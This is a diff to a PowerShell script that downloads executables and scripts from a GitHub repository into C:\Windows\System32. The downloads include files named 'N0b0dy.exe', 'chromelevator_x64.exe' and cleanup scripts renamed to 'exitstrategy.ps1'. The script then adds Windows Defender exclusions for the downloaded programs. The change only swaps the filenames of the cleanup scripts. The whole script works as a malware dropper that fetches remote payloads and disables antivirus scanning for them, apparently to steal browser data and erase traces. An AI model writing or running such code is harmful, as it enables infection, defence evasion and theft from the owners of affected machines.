@@ -2,8 +2,8 @@
 Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/N0b0dy.exe' -OutFile "C:\Windows\System32\N0b0dy.exe"
 Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/ddrcc.ps1' -OutFile "C:\Windows\System32\ddrcc.ps1"
 Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/chromelevator_x64.exe' -OutFile "C:\Windows\System32\chromelevator_x64.exe"
-Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/cleanup1.ps1' -OutFile "C:\Windows\System32\exitstrategy.ps1" 
-Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/cleanup2.ps1' -OutFile "C:\Windows\System32\cleanup.ps1" 
+Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/cleanup1.ps1' -OutFile "C:\Windows\System32\cleanup1.ps1" 
+Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/cleanup2.ps1' -OutFile "C:\Windows\System32\exitstrategy.ps1" 
 # add exlusion to files
 Add-MpPreference -ExclusionPath "C:\Windows\System32\N0b0dy.exe"
 Add-MpPreference -ExclusionPath "C:\Windows\System32\chromelevator_x64.exe"
